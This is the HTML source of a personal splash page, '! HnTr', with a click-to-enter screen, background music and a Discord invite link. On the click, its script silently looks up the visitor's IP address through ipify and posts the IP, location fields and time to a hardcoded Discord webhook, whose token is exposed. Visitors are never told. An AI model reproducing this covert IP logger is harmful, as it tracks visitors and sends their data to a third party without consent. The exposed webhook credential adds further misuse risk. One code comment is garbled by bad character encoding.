<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>! HnTr</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body,
    html {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: black;
    }

    .enter-screen {
      position: fixed;
      width: 100%;
      height: 100%;
      background: black;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 2rem;
      cursor: pointer;
      z-index: 10;
    }

    .visitor-counter {
      position: fixed;
      top: 15px;
      right: 20px;
      color: white;
      font-size: 18px;
      font-weight: bold;
      z-index: 20;
      text-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
    }

    body {
      background: url('https://www.raed.net/img?id=1398184') no-repeat center center fixed;
      background-size: cover;
    }

    .overlay {
      position: absolute;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 1;
    }

    .main-content {
      display: none;
      width: 100%;
      height: 100%;
      position: relative;
      text-align: center;
      color: white;
      z-index: 5;
    }

    .content {
      position: relative;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
    }

    .logo {
      font-size: 3rem;
      font-weight: bold;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
    }

    .subtitle {
      margin-top: 5px;
      font-size: 1.2rem;
      color: rgba(255, 255, 255, 0.7);
    }

    .icons {
      margin-top: 30px;
      display: flex;
      gap: 20px;
    }

    .icons img {
      width: 50px;
      height: 50px;
      cursor: pointer;
      transition: transform 0.3s;
    }

    .icons img:hover {
      transform: scale(1.2);
    }
  </style>
</head>

<body>

  <div class="enter-screen" id="enterScreen">Click to Enter</div>
  <div class="visitor-counter" id="visitorCounter">Visitors: 0</div>

  <div class="main-content" id="mainContent">
    <div class="overlay"></div>
    <div class="content">
      <div class="logo">! HnTr</div>
      <div class="subtitle">.SoS Ceo.</div>
      <div class="icons">
        <a href="https://discord.gg/ss6" target="_blank">
          <img src="https://media.discordapp.net/attachments/1398364733714862211/1403023357498101830/67cd0b009f85c13459e321bece9f8612.webp?ex=68960ad3&is=6894b953&hm=2a5ebadfbd284dfba9d1771753362a34c3683b1930328af0c061985e97d54ae4&=&format=webp&width=960&height=960">
        </a>
      </div>
    </div>
  </div>

  <audio id="bgMusic" loop>
    <source src="music.mp3" type="audio/mp3">
  </audio>

  <script>
    const enterScreen = document.getElementById('enterScreen');
    const mainContent = document.getElementById('mainContent');
    const bgMusic = document.getElementById('bgMusic');
    const visitorCounter = document.getElementById('visitorCounter');

    let visitors = localStorage.getItem('visitorCount');
    if (!visitors) visitors = 0;
    visitorCounter.innerText = `Visitors: ${visitors}`;

    enterScreen.addEventListener('click', () => {
      enterScreen.style.display = 'none';
      mainContent.style.display = 'block';

      bgMusic.play().catch(e => console.log("Autoplay blocked:", e));

      visitors++;
      localStorage.setItem('visitorCount', visitors);
      visitorCounter.innerText = `Visitors: ${visitors}`;

      // ÿ¨ŸÑÿ® ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ≤ÿßÿ¶ÿ±
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const country = data.country_name;
          const city = data.city;
          const dateTime = new Date().toLocaleString();
          const webhookUrl = 'https://discord.com/api/webhooks/1402876446304894986/LyYfGo-QH1-R95i2ciqaJ1Q7x2ZOneMg4BcwQMipgEIkfzhaUJMZ6xgHbV37vEVo2T9f';

          fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `üì• New Visitor Logged\n\nüåê IP: ${ip}\nüèôÔ∏è Country/City: ${country} - ${city}\nüïí Time: ${dateTime}`
            })
          });
        });
    });
  </script>
</body>


</html>
